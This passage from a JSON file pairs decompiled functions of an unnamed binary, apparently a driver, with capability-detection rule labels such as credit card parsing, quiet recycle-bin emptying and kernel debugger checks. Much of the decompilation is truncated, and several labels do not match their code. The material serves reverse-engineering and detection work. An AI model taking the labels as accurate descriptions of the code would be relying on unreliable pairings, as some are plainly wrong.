        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000785d0(int32_t arg_8h, uint arg_ch, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_5h;\n    \n    var_5h._0_1_ = '\\0';\n    (**0x800510d0)(&var_18h, 0, 0);\n    *(arg_8h + 0x2c) = &var_18h;\n    *(arg_8h + 0x28) = arg_10h;\n    if (arg_14h != -1) {\n        iVar1 = *(arg_8h + 0x60);\n        var_1ch = iVar1 + -0x24;\n        *(iVar1 + -8) = 0x800b8730;\n        *(iVar1 + -4) = &var_18h;\n        *(iVar1 + -0x21) = 0;\n        *(iVar1 + -0x21) = 0x40;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n    }\n    *NULL = (**0x80051288)();\n    if (*NULL == 0x103) {\n        if (arg_14h == -1) {\n            (**0x80051194)(&var_18h, 0, 0, 0, 0);\n        }\n        else {\n            _var_28h = fcn.00078be2(arg_14h, arg_14h >> 0x1f, 0xffffd8f0, 0xffffffff);\n            iVar1 = (**0x80051194)(&var_18h, 0, 0, 0, &var_28h);\n            if (iVar1 == 0x102) {\n                var_5h._0_1_ = '\\x01';\n                (**0x80051238)(arg_8h);\n                (**0x80051194)(&var_18h, 0, 0, 0, 0);\n            }\n        }\n    }\n    if (arg_14h != -1) {\n        (**0x800512e8)();\n    }\n    if (stack0xfffffff8 == 0x103) {\n        unique0x00007a00 = *arg_10h;\n    }\n    if (var_5h != '\\0') {\n        stack0xfffffff8 = 0x102;\n    }\n    return stack0xfffffff8;\n}\n",
        "token_count": 631
    },
    "00037b30": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00037b30(uint8_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t var_ch;\n    uint8_t *var_6h;\n    \n    do {\n        var_6h._0_1_ = 0;\n        stack0xfffffff8 = arg_8h;\n        for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n            iVar1 = fcn.00078a6e();\n            uVar2 = iVar1 % 0x3e;\n            if (uVar2 < 10) {\n                *stack0xfffffff8 = uVar2 + 0x30;\n            }\n            else if (uVar2 - 10 < 0x1a) {\n                *stack0xfffffff8 = uVar2 + 0x37;\n            }\n            else {\n                *stack0xfffffff8 = uVar2 + 0x3d;\n            }\n            var_6h._0_1_ = var_6h + *stack0xfffffff8;\n            *0x8 = stack0xfffffff8 + 1;\n        }\n    } while ((((*arg_8h == 0x41) && (arg_8h[1] == *arg_8h + 1)) && (arg_8h[2] == arg_8h[1] + 1)) &&\n            (arg_8h[3] == arg_8h[2] + 1));\n    *stack0xfffffff8 = var_6h / 0x1a + 0x41;\n    stack0xfffffff8[1] = 0x7a - var_6h % 0x1a;\n    return;\n}\n",
        "token_count": 407
    },
    "000317c0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000317c0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t var_12ch;\n    uint32_t var_128h;\n    uint32_t var_124h;\n    uint32_t var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_98h;\n    uint32_t *var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_54h = 0; var_54h < 0x10; var_54h = var_54h + 1) {\n        (&var_50h)[var_54h] = 0;\n    }\n    if (0x10 < arg_ch) {\n        arg_ch = 0x10;\n    }\n    for (var_54h = 0; var_54h < arg_ch; var_54h = var_54h + 1) {\n        (&var_50h)[var_54h] = *(arg_10h + var_54h);\n    }\n    if (arg_ch < 0xb) {\n        *(arg_8h + 0x80) = 1;\n    }\n    else {\n        *(arg_8h + 0x80) = 0;\n    }\n    var_58h = &var_d8h;\n    var_12ch = var_50h << 0x18 | var_4ch << 0x10 | var_48h << 8 | var_44h;\n    var_128h = var_40h << 0x18 | var_3ch << 0x10 | var_38h << 8 | var_34h;\n    var_124h = var_30h << 0x18 | var_2ch << 0x10 | var_28h << 8 | var_24h;\n    var_120h = var_20h << 0x18 | var_1ch << 0x10 | var_18h << 8 | var_14h;\n    while( true ) {\n        uVar8 = var_12ch ^ *(var_1ch * 4 + -0x7ffaca20) ^ *(var_14h * 4 + -0x7ffac620) ^ *(var_20h * 4 + -0x7ffac220) ^\n                *(var_18h * 4 + -0x7ffabe20) ^ *(var_30h * 4 + -0x7ffac220);\n        uVar1 = uVar8 & 0xff;\n        uVar5 = uVar8 >> 8 & 0xff;\n        uVar9 = uVar8 >> 0x10 & 0xff;\n        uVar2 = uVar8 >> 0x18;\n        uVar10 = var_124h ^ *(uVar2 * 4 + -0x7ffaca20) ^ *(uVar5 * 4 + -0x7ffac620) ^ *(uVar9 * 4 + -0x7ffac220) ^\n                 *(uVar1 * 4 + -0x7ffabe20) ^ *(var_28h * 4 + -0x7ffabe20);\n        uVar3 = uVar10 & 0xff;\n        uVar6 = uVar10 >> 8 & 0xff;\n        uVar11 = uVar10 >> 0x10 & 0xff;\n        uVar4 = uVar10 >> 0x18;\n        uVar12 = var_120h ^ *(uVar3 * 4 + -0x7ffaca20) ^ *(uVar6 * 4 + -0x7ffac620) ^ *(uVar11 * 4 + -0x7ffac220) ^\n                 *(uVar4 * 4 + -0x7ffabe20) ^ *(var_2ch * 4 + -0x7ffaca20);\n        uVar7 = uVar12 >> 8 & 0xff;\n        uVar13 = uVar12 >> 0x10 & 0xff;\n        uVar14 = var_128h ^ *(uVar7 * 4 + -0x7ffaca20) ^ *(uVar13 * 4 + -0x7ffac620) ^\n                 *((uVar12 & 0xff) * 4 + -0x7ffac220) ^ *((uVar12 >> 0x18) * 4 + -0x7ffabe20) ^\n                 *(var_24h * 4 + -0x7ffac620);\n        *var_58h = *((uVar12 >> 0x18) * 4 + -0x7ffaca20) ^ *(uVar13 * 4 + -0x7ffac620) ^ *(uVar3 * 4 + -0x7ffac220) ^\n                   *(uVar6 * 4 + -0x7ffabe20) ^ *(uVar5 * 4 + -0x7ffaca20);\n        var_58h[1] = *(uVar7 * 4 + -0x7ffaca20) ^ *((uVar12 & 0xff) * 4 + -0x7ffac620) ^ *(uVar11 * 4 + -0x7ffac220) ^\n                     *(uVar4 * 4 + -0x7ffabe20) ^ *(uVar6 * 4 + -0x7ffac620);\n        var_58h[2] = *((uVar14 >> 0x18) * 4 + -0x7ffaca20) ^ *((uVar14 >> 0x10 & 0xff) * 4 + -0x7ffac620) ^\n                     *(uVar1 * 4 + -0x7ffac220) ^ *(uVar5 * 4 + -0x7ffabe20) ^ *(uVar13 * 4 + -0x7ffac220);\n        var_58h[3] = *((uVar14 >> 8 & 0xff) * 4 + -0x7ffaca20) ^ *((uVar14 & 0xff) * 4 + -0x7ffac620) ^\n                     *(uVar9 * 4 + -0x7ffac220) ^ *(uVar2 * 4 + -0x7ffabe20) ^ *((uVar14 >> 0x18) * 4 + -0x7ffabe20);\n        uVar6 = uVar12 ^ *(uVar11 * 4 + -0x7ffaca20) ^ *(uVar3 * 4 + -0x7ffac620) ^ *(uVar4 * 4 + -0x7ffac220) ^\n                *(uVar6 * 4 + -0x7ffabe20) ^ *(uVar2 * 4 + -0x7ffac220);\n        uVar13 = uVar6 & 0xff;\n        uVar2 = uVar6 >> 8 & 0xff;\n        uVar7 = uVar6 >> 0x10 & 0xff;\n        uVar8 = uVar8 ^ *((uVar6 >> 0x18) * 4 + -0x7ffaca20) ^ *(uVar2 * 4 + -0x7ffac620) ^ *(uVar7 * 4 + -0x7ffac220) ^\n                *(uVar13 * 4 + -0x7ffabe20) ^ *(uVar5 * 4 + -0x7ffabe20);\n        uVar15 = uVar8 & 0xff;\n        uVar3 = uVar8 >> 8 & 0xff;\n        uVar5 = uVar8 >> 0x10 & 0xff;\n        uVar9 = uVar10 ^ *(uVar15 * 4 + -0x7ffaca20) ^ *(uVar3 * 4 + -0x7ffac620) ^ *(uVar5 * 4 + -0x7ffac220) ^\n                *((uVar8 >> 0x18) * 4 + -0x7ffabe20) ^ *(uVar9 * 4 + -0x7ffaca20);\n        uVar16 = uVar9 & 0xff;\n        uVar4 = uVar9 >> 8 & 0xff;\n        uVar10 = uVar9 >> 0x10 & 0xff;\n        uVar17 = uVar9 >> 0x18;\n        uVar11 = uVar14 ^ *(uVar4 * 4 + -0x7ffaca20) ^ *(uVar10 * 4 + -0x7ffac620) ^ *(uVar16 * 4 + -0x7ffac220) ^\n                 *(uVar17 * 4 + -0x7ffabe20) ^ *(uVar1 * 4 + -0x7ffac620);\n        uVar1 = uVar11 >> 8 & 0xff;\n        uVar12 = uVar11 >> 0x10 & 0xff;\n        var_58h[4] = *(uVar13 * 4 + -0x7ffaca20) ^ *(uVar2 * 4 + -0x7ffac620) ^ *((uVar11 >> 0x18) * 4 + -0x7ffac220) ^\n                     *(uVar12 * 4 + -0x7ffabe20) ^ *(uVar17 * 4 + -0x7ffaca20);\n        var_58h[5] = *(uVar7 * 4 + -0x7ffaca20) ^ *((uVar6 >> 0x18) * 4 + -0x7ffac620) ^ *(uVar1 * 4 + -0x7ffac220) ^\n                     *((uVar11 & 0xff) * 4 + -0x7ffabe20) ^ *(uVar12 * 4 + -0x7ffac620);\n        var_58h[6] = *(uVar15 * 4 + -0x7ffaca20) ^ *(uVar3 * 4 + -0x7ffac620) ^ *(uVar17 * 4 + -0x7ffac220) ^\n                     *(uVar10 * 4 + -0x7ffabe20) ^ *(uVar13 * 4 + -0x7ffac220);\n        var_58h[7] = *(uVar5 * 4 + -0x7ffaca20) ^ *((uVar8 >> 0x18) * 4 + -0x7ffac620) ^ *(uVar4 * 4 + -0x7ffac220) ^\n                     *(uVar16 * 4 + -0x7ffabe20) ^ *(uVar15 * 4 + -0x7ffabe20);\n        uVar1 = uVar6 ^ *(uVar12 * 4 + -0x7ffaca20) ^ *((uVar11 & 0xff) * 4 + -0x7ffac620) ^\n                *((uVar11 >> 0x18) * 4 + -0x7ffac220) ^ *(uVar1 * 4 + -0x7ffabe20) ^ *(uVar17 * 4 + -0x7ffac220);\n        uVar12 = uVar1 & 0xff;\n        uVar15 = uVar1 >> 8 & 0xff;\n        uVar2 = uVar1 >> 0x10 & 0xff;\n        uVar13 = uVar1 >> 0x18;\n        uVar3 = uVar9 ^ *(uVar13 * 4 + -0x7ffaca20) ^ *(uVar15 * 4 + -0x7ffac620) ^ *(uVar2 * 4 + -0x7ffac220) ^\n                *(uVar12 * 4 + -0x7ffabe20) ^ *(uVar4 * 4 + -0x7ffabe20);\n        uVar9 = uVar3 & 0xff;\n        uVar17 = uVar3 >> 8 & 0xff;\n        uVar4 = uVar3 >> 0x10 & 0xff;\n        uVar14 = uVar3 >> 0x18;\n        uVar5 = uVar11 ^ *(uVar9 * 4 + -0x7ffaca20) ^ *(uVar17 * 4 + -0x7ffac620) ^ *(uVar4 * 4 + -0x7ffac220) ^\n                *(uVar14 * 4 + -0x7ffabe20) ^ *(uVar10 * 4 + -0x7ffaca20);\n        uVar10 = uVar5 >> 8 & 0xff;\n        uVar6 = uVar5 >> 0x10 & 0xff;\n        uVar7 = uVar8 ^ *(uVar10 * 4 + -0x7ffaca20) ^ *(uVar6 * 4 + -0x7ffac620) ^ *((uVar5 & 0xff) * 4 + -0x7ffac220) ^\n                *((uVar5 >> 0x18) * 4 + -0x7ffabe20) ^ *(uVar16 * 4 + -0x7ffac620);\n        var_58h[8] = *(uVar12 * 4 + -0x7ffaca20) ^ *(uVar15 * 4 + -0x7ffac620) ^ *((uVar7 >> 0x18) * 4 + -0x7ffac220) ^\n                     *((uVar7 >> 0x10 & 0xff) * 4 + -0x7ffabe20) ^ *(uVar6 * 4 + -0x7ffaca20);\n        var_58h[9] = *(uVar2 * 4 + -0x7ffaca20) ^ *(uVar13 * 4 + -0x7ffac620) ^ *((uVar7 >> 8 & 0xff) * 4 + -0x7ffac220)\n                     ^ *((uVar7 & 0xff) * 4 + -0x7ffabe20) ^ *((uVar7 >> 0x18) * 4 + -0x7ffac620);\n        var_58h[10] = *(uVar9 * 4 + -0x7ffaca20) ^ *(uVar17 * 4 + -0x7ffac620) ^ *((uVar5 >> 0x18) * 4 + -0x7ffac220) ^\n                      *(uVar6 * 4 + -0x7ffabe20) ^ *(uVar15 * 4 + -0x7ffac220);\n        var_58h[0xb] = *(uVar4 * 4 + -0x7ffaca20) ^ *(uVar14 * 4 + -0x7ffac620) ^ *(uVar10 * 4 + -0x7ffac220) ^\n                       *((uVar5 & 0xff) * 4 + -0x7ffabe20) ^ *(uVar17 * 4 + -0x7ffabe20);\n        var_12ch = uVar5 ^ *(uVar4 * 4 + -0x7ffaca20) ^ *(uVar9 * 4 + -0x7ffac620) ^ *(uVar14 * 4 + -0x7ffac220) ^\n                   *(uVar17 * 4 + -0x7ffabe20) ^ *(uVar13 * 4 + -0x7ffac220);\n        uVar4 = var_12ch & 0xff;\n        uVar5 = var_12ch >> 8 & 0xff;\n        uVar8 = var_12ch >> 0x10 & 0xff;\n        var_128h = uVar1 ^ *((var_12ch >> 0x18) * 4 + -0x7ffaca20) ^ *(uVar5 * 4 + -0x7ffac620) ^\n                   *(uVar8 * 4 + -0x7ffac220) ^ *(uVar4 * 4 + -0x7ffabe20) ^ *(uVar15 * 4 + -0x7ffabe20);\n        uVar1 = var_128h & 0xff;\n        uVar6 = var_128h >> 8 & 0xff;\n        uVar9 = var_128h >> 0x10 & 0xff;\n        var_124h = uVar3 ^ *(uVar1 * 4 + -0x7ffaca20) ^ *(uVar6 * 4 + -0x7ffac620) ^ *(uVar9 * 4 + -0x7ffac220) ^\n                   *((var_128h >> 0x18) * 4 + -0x7ffabe20) ^ *(uVar2 * 4 + -0x7ffaca20);\n        var_24h = var_124h & 0xff;\n        var_28h = var_124h >> 8 & 0xff;\n        var_2ch = var_124h >> 0x10 & 0xff;\n        var_30h = var_124h >> 0x18;\n        var_120h = uVar7 ^ *(var_28h * 4 + -0x7ffaca20) ^ *(var_2ch * 4 + -0x7ffac620) ^ *(var_24h * 4 + -0x7ffac220) ^\n                   *(var_30h * 4 + -0x7ffabe20) ^ *(uVar12 * 4 + -0x7ffac620);\n        var_14h = var_120h & 0xff;\n        var_18h = var_120h >> 8 & 0xff;\n        var_1ch = var_120h >> 0x10 & 0xff;\n        var_20h = var_120h >> 0x18;\n        var_58h[0xc] = *(var_30h * 4 + -0x7ffaca20) ^ *(var_2ch * 4 + -0x7ffac620) ^ *(uVar1 * 4 + -0x7ffac220) ^\n                       *(uVar6 * 4 + -0x7ffabe20) ^ *(uVar4 * 4 + -0x7ffaca20);\n        var_58h[0xd] = *(var_28h * 4 + -0x7ffaca20) ^ *(var_24h * 4 + -0x7ffac620) ^ *(uVar9 * 4 + -0x7ffac220) ^\n                       *((var_128h >> 0x18) * 4 + -0x7ffabe20) ^ *(uVar1 * 4 + -0x7ffac620);\n        var_58h[0xe] = *(var_20h * 4 + -0x7ffaca20) ^ *(var_1ch * 4 + -0x7ffac620) ^ *(uVar4 * 4 + -0x7ffac220) ^\n                       *(uVar5 * 4 + -0x7ffabe20) ^ *(var_30h * 4 + -0x7ffac220);\n        var_58h[0xf] = *(var_18h * 4 + -0x7ffaca20) ^ *(var_14h * 4 + -0x7ffac620) ^ *(uVar8 * 4 + -0x7ffac220) ^\n                       *((var_12ch >> 0x18) * 4 + -0x7ffabe20) ^ *(var_1ch * 4 + -0x7ffabe20);\n        if (var_58h != &var_d8h) break;\n        var_58h = var_58h + 0x10;\n    }\n    for (var_54h = 0; var_54h < 0x10; var_54h = var_54h + 1) {\n        *(arg_8h + var_54h * 8) = (&var_d8h)[var_54h];\n        *(arg_8h + 4 + var_54h * 8) = (&var_98h)[var_54h] + 0x10 & 0x1f;\n    }\n    return;\n}\n",
        "token_count": 4997
    },
    "00037c60": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037c60(uint8_t *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint var_210h;\n    uint var_20ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint8_t *var_4h;\n    \n    if (10 < arg_ch) {\n        var_4h = arg_8h;\n        var_5h = 0;\n        for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n            if ((*var_4h < 0x21) || (0x7f < *var_4h)) {\n                return 0;\n            }\n            var_5h = var_5h + *var_4h;\n            var_4h = var_4h + 1;\n        }\n        var_10h = arg_ch;\n        if (0x200 < arg_ch - 10) {\n            var_10h = 0x20a;\n        }\n        if ((*var_4h == var_5h / 0x1a + 0x41) && (var_4h[1] == 0x7a - var_5h % 0x1a)) {\n            var_10h = fcn.000347a0(arg_8h + 10, &var_210h, var_10h - 10);\n            if (var_10h == 8) {\n                for (var_ch = 0; var_ch < var_10h; var_ch = var_ch + 1) {\n                    *(&var_210h + var_ch) = *(&var_210h + var_ch) ^ arg_8h[var_ch];\n                }\n                uVar1 = fcn.00035950(var_210h);\n                *arg_10h = uVar1;\n                uVar1 = fcn.00035950(var_20ch);\n                arg_10h[1] = uVar1;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 479
    },
    "000383c0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.000383c0(void)\n\n{\n    ushort uVar1;\n    int32_t arg_8h;\n    uint32_t var_4h;\n    \n    *0x800cd8f4 = 0;\n    *0x800cd8f8 = 0;\n    *0x800cd8fc = 0;\n    *0x800cd900 = 0;\n    *0x800cd904 = 0;\n    var_4h = 0;\n    while (var_4h < 10) {\n        arg_8h = fcn.000298c0(var_4h + 0x2f3, 0);\n        uVar1 = fcn.00035980(arg_8h);\n        *(arg_8h * 2 + -0x7ff3270c) = uVar1;\n        var_4h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 224
    },
    "00038430": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t fcn.00038430(void)\n\n{\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n        var_4h = (*(var_8h * 2 + -0x7ff3270c) != 0) + var_4h;\n    }\n    return var_4h;\n}\n",
        "token_count": 118
    },
    "00038480": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00038480(uint arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (9 < var_4h) {\n            return 0;\n        }\n        if (*(var_4h * 2 + -0x7ff3270c) == arg_8h) break;\n        var_4h = var_4h + 1;\n    }\n    return 1;\n}\n",
        "token_count": 110
    },
    "00072050": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00072079\n\nuint __cdecl fcn.00072050(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (10 < arg_ch - 3U) {\n        return 0x21590001;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 102
    },
    "00020af0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00020b15\n\nuint __cdecl fcn.00020af0(int32_t arg_8h)\n\n{\n    uint var_10h;\n    \n    if (7 < arg_8h - 2U) {\n        return 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 98
    },
    "00017c00": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00017c3b\n\nuint __cdecl fcn.00017c00(int32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_22ch;\n    \n    if (0x25 < arg_8h - 1U) {\n        return arg_10h;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 115
    },
    "0005edf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005ee23 : 61 cases all go to same destination\n\nuint __cdecl fcn.0005edf0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0005e710(arg_8h, arg_ch);\n    if (0x3c < iVar1 - 4U) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 137
    },
    "000613f0": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000613f0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    \n    *(arg_8h + 0x98) = *(arg_8h + 0x112 + *(arg_8h + 4)) * 0x20 + -0x7ff46b48;\n    if (*(arg_8h + 0x112 + *(arg_8h + 4)) == -0x70) {\n        if ((*(arg_8h + 0x8c) != '@') || ((*(arg_8h + 0x101) & 1) == 0)) {\n            if (*(arg_8h + 0x106) == '\\0') {\n                *(arg_8h + 0x98) = 0x800caa38;\n            }\n            else {\n                *(arg_8h + 0x98) = 0x800caa58;\n                *(arg_8h + 0x106) = 0;\n            }\n        }\n    }\n    else if ((*(arg_8h + 0x8c) == '@') && (**(arg_8h + 0x98) == 0xf)) {\n        *(arg_8h + 0x98) = 0x800caa78;\n    }\n    else if (**(arg_8h + 0x98) == 0x216) {\n        iVar1 = *(*(arg_8h + 0x98) + 0x1c);\n        uVar3 = fcn.00060e60(arg_8h);\n        *(arg_8h + 0x98) = ((uVar3 & 0xff) >> 3 & 7U) * 0x20 + *(iVar1 * 0x10 + -0x7ff3a0e8);\n    }\n    else if (**(arg_8h + 0x98) == 0x21f) {\n        uVar2 = fcn.00060e60(arg_8h);\n        if (uVar2 < 0xc0) {\n            uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4));\n            uVar3 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar3 & 0xff) >> 3 & 7U) * 0x20 + *(uVar2 * 4 + -0x7ff35988);\n        }\n        else {\n            uVar2 = *(arg_8h + 0x112 + *(arg_8h + 4));\n            uVar3 = fcn.00060e60(arg_8h);\n            *(arg_8h + 0x98) = ((uVar3 & 0xff) - 0xc0) * 0x20 + *(uVar2 * 4 + -0x7ff35968);\n            fcn.00060d60(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 691
    },
    "00050880": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00050880(int16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    var_8h = 0;\n    while( true ) {\n        if (5 < var_8h) {\n            return 1;\n        }\n        uVar1 = fcn.00036400(var_4h, &var_4h, 0x10);\n        if (0xff < uVar1) break;\n        if (var_8h < 5) {\n            if ((*var_4h != 0x2d) && (*var_4h != 0x3a)) {\n                return 0;\n            }\n            var_4h = var_4h + 1;\n        }\n        else if (*var_4h != 0) {\n            return 0;\n        }\n        *(arg_ch + var_8h) = uVar1;\n        var_8h = var_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "00020700": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00020700(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    return (arg_10h + 7U & 0xfffffff8) + 1;\n}\n",
        "token_count": 56
    },
    "0005e710": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005e732\n\nint32_t __cdecl fcn.0005e710(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (6 < arg_ch - 1U) {\n        return arg_ch;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 102
    },
    "0006eaa0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006eaa0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_ch == 6) {\n        if (arg_14h == 0xc) {\n            fcn.00078be8(arg_8h + 0xec, arg_10h, 0xc);\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 0x21590064;\n        }\n    }\n    else {\n        uVar1 = fcn.00075120(*(arg_8h + 0xc), arg_ch, arg_10h, arg_14h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 175
    },
    "000347a0": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000347a0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_120h;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    uint var_110h;\n    uint var_e5h;\n    uint var_e1h;\n    uint var_d3h;\n    char acStack211 [32];\n    char acStack179 [163];\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_114h = 0;\n    fcn.00078bfa(&var_110h, 0x80, 0xff);\n    for (var_ch = 0x41; var_ch < 0x5b; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + -0x41;\n    }\n    for (var_ch = 0x61; var_ch < 0x7b; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + -0x47;\n    }\n    for (var_ch = 0x30; var_ch < 0x3a; var_ch = var_ch + 1) {\n        *(&var_110h + var_ch) = var_ch + '\\x04';\n    }\n    var_e5h._0_1_ = 0x3e;\n    var_e1h._0_1_ = 0x3f;\n    var_d3h._0_1_ = 0;\n    uVar1 = arg_10h & 0x80000003;\n    if (uVar1 < 0) {\n        uVar1 = (uVar1 - 1 | 0xfffffffc) + 1;\n    }\n    if (uVar1 == 0) {\n        for (var_ch = 0; var_ch < arg_10h; var_ch = var_ch + 4) {\n            var_4h = arg_8h + var_ch;\n            for (var_8h = 0; var_8h < 4; var_8h = var_8h + 1) {\n                *(&var_118h + var_8h) = *(&var_110h + *(var_4h + var_8h));\n            }\n            var_11ch._0_1_ = var_118h << 2 | var_118h._1_1_ >> 4;\n            var_11ch._1_1_ = var_118h._1_1_ << 4 | var_118h._2_1_ >> 2;\n            var_11ch._2_1_ = var_118h._2_1_ << 6 | var_118h._3_1_;\n            if (*(var_4h + 2) == '=') {\n                var_120h = 1;\n            }\n            else {\n                var_120h = (*(var_4h + 3) != '=') + 2;\n            }\n            var_8h = var_120h;\n            fcn.00078be8(arg_ch + var_114h, &var_11ch, var_120h);\n            var_114h = var_114h + var_8h;\n        }\n        *(arg_ch + var_114h) = 0;\n    }\n    else {\n        var_114h = -1;\n    }\n    return var_114h;\n}\n",
        "token_count": 811
    },
    "0005eef0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
